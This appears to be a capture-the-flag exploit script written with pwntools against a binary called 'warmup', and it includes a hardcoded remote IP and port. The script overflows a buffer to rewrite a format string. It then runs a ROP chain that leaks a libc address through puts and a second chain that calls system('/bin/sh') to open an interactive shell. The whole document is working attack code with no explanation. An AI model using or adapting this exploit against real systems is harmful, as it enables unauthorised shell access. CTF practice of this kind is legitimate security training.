#!/usr/bin/env python2
from pwn import *

exe = ELF("./warmup")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "debug"
IP, PORT = "35.244.36.192", 8001

global io
breakpoints = '''
break *0x0000000000401390
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path,env={"LD_PRELOAD":"./libc.so"})
else:
    io = gdb.debug(exe.path,env={"LD_PRELOAD":"./libc.so"}, gdbscript=breakpoints)

main = exe.symbols['main']
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
read_got = exe.got['read']
pop_rdi = 0x401403

name = 0x4040a0
fmt = 0x4040e0

off = fmt - name

def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

def set_fmt_string():
    reu("is ")
    size = int(rl().strip(),16)

    while (size < off ):
        sl("y")
        reu("is ")
        size = int(rl().strip(),16)

    sl("n")
    payload = b"A"*off + b"%s\x00"


    log.info("size : "+str(size))
    sa("go:\n",payload)

def send_payload(pyld):
    reu("e?")
    sl(pyld)
    reu("Bye!\n")

set_fmt_string()

payload = "A"*0x28
payload += flat([
    pop_rdi,read_got,
    puts_plt,
    main
])

send_payload(payload)

libc_leak = unpack(rl(),48)
log.info("Libc Leak -> "+hex(libc_leak))
libc.address = libc_leak - 0x110140

system = libc.symbols['system']
bin_sh = next(libc.search("/bin/sh"))
ret = 0x40101a

set_fmt_string()

payload = "A"*0x28
payload += flat([
    pop_rdi, bin_sh,
    ret, system
])

send_payload(payload)

io.interactive()